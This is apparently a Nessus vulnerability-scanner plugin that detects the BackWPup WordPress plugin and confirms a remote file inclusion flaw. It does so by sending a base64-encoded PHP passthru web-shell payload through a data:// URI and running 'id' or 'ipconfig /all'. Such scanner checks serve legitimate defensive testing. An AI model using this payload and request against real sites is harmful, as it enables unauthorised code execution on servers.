#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(53210);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 20:59:28 $");

  script_bugtraq_id(47058);
  script_xref(name:"EDB-ID", value:"17056");

  script_name(english:"BackWPup for WordPress Plugin Remote File Inclusion");
  script_summary(english:"Attemps to inject script code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is vulnerable to a
remote file inclusion attack.");
  script_set_attribute(attribute:"description", value:
"The version of the BackWPup for WordPress plugin installed on the
remote host does not sanitize input to the 'wpabs' parameter of the
'app/wp_xml_export.php' script before using it in a 'require_once()'
call when the '_nonce' parameter is set to a specific value.

An attacker can leverage this issue to view files on the local host or
to execute arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/517207/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Upgrade to BackWPup version 1.7.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/03/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/03/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/03/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "BackWPup";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "backwpup/lang/backwpup.pot"][0] =
    make_list('Run Database', 'BackWPup Job');
  # Readme.txt
  checks[path + "backwpup/readme.txt"][0] =
    make_list('=== BackWPup( Free)?');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext     : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to exploit the issue to run a command.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";

nesstr = "NESSUS_" + toupper(rand_str());
payload = '<?php passthru(base64_decode($_GET[' + nesstr + '])); die; ?>';

foreach cmd (cmds)
{
  url = dir + '/wp-content/plugins/backwpup/app/wp_xml_export.php?' +
    '_nonce=822728c8d9&' +
    'wpabs=data://text/plain;base64,' + urlencode(str:base64(str:payload)) + '&' +
    nesstr + '=' + base64(str:cmd);

  # nb: the PHP script hardcodes a 404 response unless 'wpabs' points to
  #     the WordPress installation directory so we need to fetch the
  #     response body in such a response.
  res = http_send_recv3(method:"GET", item:url, port:port, fetch404:TRUE, exit_on_fail:TRUE);

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      header =
        'Nessus was able to execute the command \'' + cmd + '\' on the remote\n' +
        'host using the following URL';
      trailer = '';

      if (report_verbosity > 1)
      {
        trailer =
          'This produced the following output :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          res[2] +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
